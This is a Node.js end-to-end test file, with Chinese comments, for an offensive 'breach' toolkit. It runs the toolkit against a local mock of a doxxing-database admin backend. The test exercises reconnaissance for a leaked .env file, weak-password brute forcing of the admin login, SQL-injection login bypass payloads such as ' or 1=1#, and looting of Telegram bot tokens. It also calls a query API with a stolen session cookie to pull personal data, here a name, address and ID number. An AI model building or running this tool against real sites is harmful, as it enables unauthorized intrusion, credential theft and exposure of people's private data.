'use strict';

// 后台突破的端到端测试：本地起一个"社工库后台"靶站，真跑一遍侦察 + 弱口令 + 注入 + 扫荡。
// 靶站：/admin.php 登录页（带隐藏 _token），口令 admin/admin888 成功；
//       /.env 泄露含 Bot Token；/api/query 是需要 Cookie 的查询接口。

const http = require('http');
const breach = require('./src/core/breach');
const recon = require('./src/core/recon');

const PORT = 4555;
// Telegram bot token 格式：8-10 位数字 + ':' + 35 位 [A-Za-z0-9_-]
const TOKEN = '7123456789:' + 'Abc123Xyz_'.repeat(3) + 'Abc12';
const GOOD = { u: 'admin', p: 'admin888' };

const LOGIN_PAGE = `<html><head><title>查档后台登录</title></head><body>
<form method="post" action="/admin.php">
<input type="hidden" name="_token" value="csrf_9f2a">
<input type="text" name="username"><input type="password" name="password">
<input type="submit" value="登录"></form></body></html>`;

const FAIL_BODY = '<html><body>用户名或密码错误，请重新登录。<a href="/admin.php">返回</a></body></html>';
const OK_BODY = '<html><body><h1>后台管理</h1><a href="/admin/kami">卡密管理</a>' +
  `<a href="/admin/query">查询记录</a><div>bot_token=${TOKEN}</div><a href="/logout">退出</a></body></html>`;

const ENV_BODY = `APP_ENV=production\nDB_PASSWORD=sgk12345\nTELEGRAM_BOT_TOKEN=${TOKEN}\n`;

function startTarget(port) {
  const sessions = new Set();
  return http.createServer((req, res) => {
    const u = new URL(req.url, 'http://127.0.0.1');
    const p = u.pathname;

    if (p === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'X-Powered-By': 'ThinkPHP' });
      return res.end('<html><head><title>查档查询系统</title></head><body><a href="/admin.php">后台</a></body></html>');
    }
    if (p === '/admin.php' && req.method === 'GET') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'X-Powered-By': 'ThinkPHP' });
      return res.end(LOGIN_PAGE);
    }
    if (p === '/.env') {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      return res.end(ENV_BODY);
    }
    if (p === '/admin.php' && req.method === 'POST') {
      let body = '';
      req.on('data', (d) => { body += d; });
      return req.on('end', () => {
        const q = new URLSearchParams(body);
        const user = q.get('username') || '';
        const pass = q.get('password') || '';
        // 万能口令注入：' or 1=1# 之类的也放行，用来验证 sqli 分支
        const injected = /or\s+1=1|or\s+'1'='1|or\s+'a'='a/i.test(pass + user);
        if ((user === GOOD.u && pass === GOOD.p) || injected) {
          const sid = 'admin_auth=' + Math.random().toString(36).slice(2);
          sessions.add(sid);
          res.writeHead(302, { Location: '/admin/index.php', 'Set-Cookie': sid + '; Path=/' });
          return res.end('ok');
        }
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return res.end(FAIL_BODY);
      });
    }
    if (p === '/api/query') {
      let body = '';
      req.on('data', (d) => { body += d; });
      return req.on('end', () => {
        const cookie = req.headers.cookie || '';
        if (!sessions.has(cookie)) {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          return res.end('{"code":401,"msg":"未登录"}');
        }
        const q = new URLSearchParams(body);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({
          code: 0,
          data: { 姓名: '张三', 住址: '广东省汕头市金平区金砂街道123号', 手机: q.get('keyword') || '', 身份证号: '440524199001011234' },
        }));
      });
    }
    if (p === '/admin/index.php') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(OK_BODY);
    }
    res.writeHead(404);
    res.end('not found');
  }).listen(port || PORT);
}

function stopTarget(srv) {
  return new Promise((r) => srv.close(r));
}

module.exports = { startTarget, stopTarget, TOKEN, GOOD, PORT };

let pass = 0, fail = 0;
function check(label, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  console.log((ok ? 'PASS ' : 'FAIL ') + label + ' => ' + JSON.stringify(actual) + (ok ? '' : ' (期望 ' + JSON.stringify(expected) + ')'));
  ok ? pass++ : fail++;
}

async function run() {
  const srv = startTarget();
  const base = 'http://127.0.0.1:' + PORT;

  // 1. 侦察：应识别出 .env 泄露并抠出 Bot Token
  const r = await recon.recon(base, { subdomains: false, paths: ['/admin.php', '/.env', '/nope-404'] });
  check('首页可达', r.home.status, 200);
  check('识别出 ThinkPHP 指纹', r.fingerprints.includes('ThinkPHP'), true);
  const envHit = r.paths.find((x) => x.url.endsWith('/.env'));
  check('.env 被判定为泄露', envHit && envHit.note.startsWith('★'), true);
  check('404 未列入', r.paths.some((x) => x.url.includes('nope-404')), false);

  // 2. 登录页解析
  const page = await breach.getLoginPage(base + '/admin.php');
  check('抓到隐藏 _token', page.hidden._token, 'csrf_9f2a');
  check('抓到表单字段', page.fields.sort(), ['password', 'username']);

  // 3. 弱口令爆破
  const br = await breach.bruteLogin({
    url: base + '/admin.php',
    usernames: ['admin'],
    passwords: ['123456', 'admin123', 'admin888', 'wrongpass'],
    stopOnFirst: true,
  });
  check('爆破命中', br.candidates.length >= 1, true);
  check('命中账号', br.candidates[0] && br.candidates[0].username, 'admin');
  check('命中口令', br.candidates[0] && br.candidates[0].password, 'admin888');
  check('拿到会话 Cookie', /admin_auth=/.test((br.candidates[0] || {}).cookie || ''), true);

  // 4. SQL 注入万能口令
  const sq = await breach.sqliLogin({
    url: base + '/admin.php',
    usernames: ['admin'],
    payloads: ["admin' or '1'='1", "' or 1=1#"],
  });
  check('注入命中', sq.candidates.length >= 1, true);

  // 5. 登录后扫荡：抠 Bot Token + 盲到查询接口
  const cookie = (br.candidates[0] || {}).cookie || '';
  const loot = await breach.loot({
    baseUrl: base,
    cookie,
    paths: ['/api/query'],
    sampleParams: { keyword: '13800138000' },
  });
  check('扫到 Bot Token', loot.botTokens.includes(TOKEN), true);
  check('盲到查询接口', loot.queryApis.length, 1);

  // 6. 拿 Cookie 直调查询接口
  const call = await breach.directCall({
    url: base + '/api/query',
    method: 'POST',
    headers: { Cookie: cookie },
    body: { keyword: '13800138000' },
  });
  check('直调返回 200', call.status, 200);
  const j = JSON.parse(call.body);
  check('拿到姓名', j.data['姓名'], '张三');
  check('拿到街道住址', j.data['住址'], '广东省汕头市金平区金砂街道123号');

  await stopTarget(srv);
  console.log('\n结果: ' + pass + ' 通过, ' + fail + ' 失败');
  process.exit(fail ? 1 : 0);
}

if (require.main === module) run();
